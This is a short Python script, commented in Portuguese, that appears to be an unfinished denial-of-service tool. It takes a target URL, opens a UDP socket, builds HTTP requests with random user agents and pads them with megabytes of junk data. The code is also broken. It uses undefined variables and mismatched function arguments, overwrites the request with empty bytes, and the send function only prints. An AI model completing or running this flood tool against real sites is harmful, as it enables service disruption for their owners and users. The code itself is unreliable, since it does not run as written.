import sys
import os
import time
import socket
import random
import argparse
import threading

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def generate_junk_data():
    """Gera junk data com o tamanho especificado em kilobytes."""
    junk_data_size_mb = 10
    return os.urandom(junk_data_size_mb * 1024 * 1024)

def get_user_agents():
    User_Agents = []
    with open("user-agents.txt","r") as agents:
        User_Agents.append(agents.read()) 

    return User_Agents

def send_packet(host,param_joiner):
    print("Packet")


def get_arguments():
    parser = argparse.ArgumentParser(description="Argumentos utilizados para informar o host que deseja realizar o ataque")
    parser.add_argument('--url', type=str, help='Digite a URL que deseja realizar o ataque Ex: teste.com')
    args = parser.parse_args()

    return args

def attack(url, path):
    user_agent = get_user_agents()
    request = f"GET {path} HTTP/1.1\r\n" \
                  f"Host: {url}\r\n" \
                  f"User-Agent: {random.choice(user_agent)}\r\n" \
                  f"Connection: close\r\n\r\n"
    junk_data = b''.join(generate_junk_data(size_kb) for size_kb in junk_sizes_kb)
    request = b""
    payload = junk_data + request
    print(junk_data)


if __name__ == "__main__":
    args = get_arguments()
    attack(args.url)